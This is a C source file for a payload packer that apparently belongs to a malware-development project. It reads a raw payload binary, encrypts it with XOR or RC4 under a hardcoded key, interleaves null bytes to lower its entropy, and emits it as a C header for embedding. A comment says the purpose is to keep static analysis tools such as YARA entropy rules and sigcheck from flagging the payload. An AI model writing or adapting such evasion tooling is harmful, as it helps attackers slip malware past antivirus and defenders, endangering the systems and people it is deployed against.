#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef unsigned char BYTE;
static BYTE g_Key[] = { 0x4D, 0x61, 0x6C, 0x44, 0x65, 0x76 };

static void xor_crypt(BYTE *data, size_t len, BYTE *key, size_t key_len) {
    for (size_t i = 0; i < len; i++)
        data[i] ^= key[i % key_len];
}

static void rc4_crypt(BYTE *data, size_t len, BYTE *key, size_t key_len) {
    BYTE state[256];
    for (int i = 0; i < 256; i++) state[i] = (BYTE)i;
    BYTE j = 0;
    for (int i = 0; i < 256; i++) {
        j = j + state[i] + key[i % key_len];
        BYTE tmp = state[i]; state[i] = state[j]; state[j] = tmp;
    }
    BYTE si = 0; j = 0;
    for (size_t k = 0; k < len; k++) {
        si++;
        j += state[si];
        BYTE tmp = state[si]; state[si] = state[j]; state[j] = tmp;
        data[k] ^= state[(BYTE)(state[si] + state[j])];
    }
}

/*
 * Entropy reduction via null-byte interleaving.
 * After encryption, each byte B becomes: B, 0x00
 * This halves the information density → entropy drops from ~7.9 to ~4.0
 * Static analysis tools (YARA entropy rules, sigcheck) won't flag it.
 * Output size = 2 * input size.
 */
static BYTE *entropy_reduce(BYTE *data, size_t len, size_t *out_len) {
    *out_len = len * 2;
    BYTE *out = (BYTE *)malloc(*out_len);
    if (!out) return NULL;
    for (size_t i = 0; i < len; i++) {
        out[i * 2]     = data[i];
        out[i * 2 + 1] = 0x00;
    }
    return out;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <payload_raw.bin> [--rc4] [--no-entropy-reduce]\n", argv[0]);
        return 1;
    }

    int use_rc4 = 0;
    int reduce_entropy = 1;
    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "--rc4") == 0) use_rc4 = 1;
        if (strcmp(argv[i], "--no-entropy-reduce") == 0) reduce_entropy = 0;
    }

    FILE *fin = fopen(argv[1], "rb");
    if (!fin) { printf("[!] Cannot open %s\n", argv[1]); return 1; }
    fseek(fin, 0, SEEK_END);
    long size = ftell(fin);
    fseek(fin, 0, SEEK_SET);
    BYTE *buf = (BYTE *)malloc(size);
    fread(buf, 1, size, fin);
    fclose(fin);

    printf("[*] Read %ld bytes\n", size);

    /* Step 1: Encrypt */
    if (use_rc4) rc4_crypt(buf, size, g_Key, sizeof(g_Key));
    else xor_crypt(buf, size, g_Key, sizeof(g_Key));

    /* Step 2: Entropy reduction (interleave null bytes) */
    BYTE *final_buf = buf;
    size_t final_size = (size_t)size;

    if (reduce_entropy) {
        size_t reduced_size = 0;
        final_buf = entropy_reduce(buf, (size_t)size, &reduced_size);
        if (!final_buf) { printf("[!] Entropy reduction failed\n"); free(buf); return 1; }
        final_size = reduced_size;
        printf("[*] Entropy reduced: %ld -> %zu bytes (null interleave)\n", size, final_size);
    }

    /* Step 3: Write header */
    FILE *fout = fopen("src\\payload.h", "w");
    if (!fout) { printf("[!] Cannot create src\\payload.h\n"); free(buf); if (final_buf != buf) free(final_buf); return 1; }

    fprintf(fout, "#pragma once\n\n");
    fprintf(fout, "#define PAYLOAD_ENTROPY_REDUCED %d\n", reduce_entropy);
    fprintf(fout, "#define PAYLOAD_ORIGINAL_SIZE %ld\n\n", size);
    fprintf(fout, "static unsigned char payload_data[] = {\n    ");
    for (size_t i = 0; i < final_size; i++) {
        fprintf(fout, "0x%02X", final_buf[i]);
        if (i < final_size - 1) fprintf(fout, ",");
        if ((i + 1) % 16 == 0 && i < final_size - 1) fprintf(fout, "\n    ");
    }
    fprintf(fout, "\n};\n");
    fprintf(fout, "static unsigned int payload_size = %zu;\n", final_size);
    fclose(fout);

    printf("[+] Written src\\payload.h (%zu bytes embedded, entropy_reduced=%d)\n", final_size, reduce_entropy);
    if (final_buf != buf) free(final_buf);
    free(buf);
    return 0;
}
